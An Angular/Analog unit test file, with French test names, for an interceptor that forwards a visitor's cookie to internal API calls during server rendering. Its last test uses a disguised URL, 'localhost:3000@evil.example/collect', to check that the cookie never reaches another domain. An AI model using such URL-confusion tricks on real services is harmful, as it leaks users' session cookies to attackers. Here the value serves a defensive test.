import { HttpClient, provideHttpClient, withInterceptors } from '@angular/common/http';
import { HttpTestingController, provideHttpClientTesting } from '@angular/common/http/testing';
import { PLATFORM_ID } from '@angular/core';
import { TestBed } from '@angular/core/testing';
import { BASE_URL, REQUEST } from '@analogjs/router/tokens';

import { forwardCookieInterceptor } from './forward-cookie.interceptor';

function setup(platform: 'server' | 'browser') {
  TestBed.configureTestingModule({
    providers: [
      { provide: PLATFORM_ID, useValue: platform },
      { provide: BASE_URL, useValue: 'http://localhost:3000' },
      { provide: REQUEST, useValue: { headers: { cookie: 'ba_player=abc' } } },
      provideHttpClient(withInterceptors([forwardCookieInterceptor])),
      provideHttpClientTesting(),
    ],
  });
  return { http: TestBed.inject(HttpClient), backend: TestBed.inject(HttpTestingController) };
}

describe('forwardCookieInterceptor', () => {
  it('transmet le cookie du visiteur aux appels internes pendant le rendu serveur', () => {
    const { http, backend } = setup('server');

    http.get('/api/_analog/pages/index').subscribe();

    expect(backend.expectOne('/api/_analog/pages/index').request.headers.get('cookie')).toBe('ba_player=abc');
  });

  it("transmet aussi le cookie quand l'appel interne utilise l'URL absolue du site", () => {
    const { http, backend } = setup('server');

    http.get('http://localhost:3000/api/_analog/pages/index').subscribe();

    expect(backend.expectOne('http://localhost:3000/api/_analog/pages/index').request.headers.get('cookie')).toBe(
      'ba_player=abc',
    );
  });

  it("ne transmet jamais le cookie à un autre domaine, même déguisé en URL du site", () => {
    const { http, backend } = setup('server');

    http.get('http://localhost:3000@evil.example/collect').subscribe();

    expect(backend.expectOne('http://localhost:3000@evil.example/collect').request.headers.has('cookie')).toBe(false);
  });
});
